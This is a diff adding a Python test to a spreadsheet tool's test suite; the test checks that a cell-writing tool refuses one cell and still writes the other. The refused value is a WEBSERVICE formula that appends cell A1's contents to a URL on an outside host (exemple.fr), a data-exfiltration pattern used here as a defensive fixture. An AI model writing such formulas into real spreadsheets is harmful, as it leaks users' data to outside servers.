@@ -348,6 +348,18 @@ def test_calc_write_cells_writes_the_unlocked_cells_and_names_each_locked_one():
     assert sheet.grid == {**original, (1, 0): "saisie"}
 
 
+def test_calc_write_cells_names_only_the_refused_cells_when_none_is_locked():
+    sheet = FakeCalcSheet()
+    result = _registry().call_tool(
+        "calc_write_cells",
+        {"cells": [{"ref": "B1", "value": "ok"},
+                   {"ref": "B2", "value": '=WEBSERVICE("http://exemple.fr/"&A1)'}]},
+        _calc_ctx(FakeCalcDoc(sheet)))
+    assert not result.ok
+    assert result.error.startswith("B2: texte refusé, ")
+    assert sheet.grid[(1, 0)] == "ok"
+
+
 def _fill_down(sheet, to_row):
     return _registry().call_tool(
         "calc_fill_formula_down", {"from_ref": "C2", "to_row": to_row},
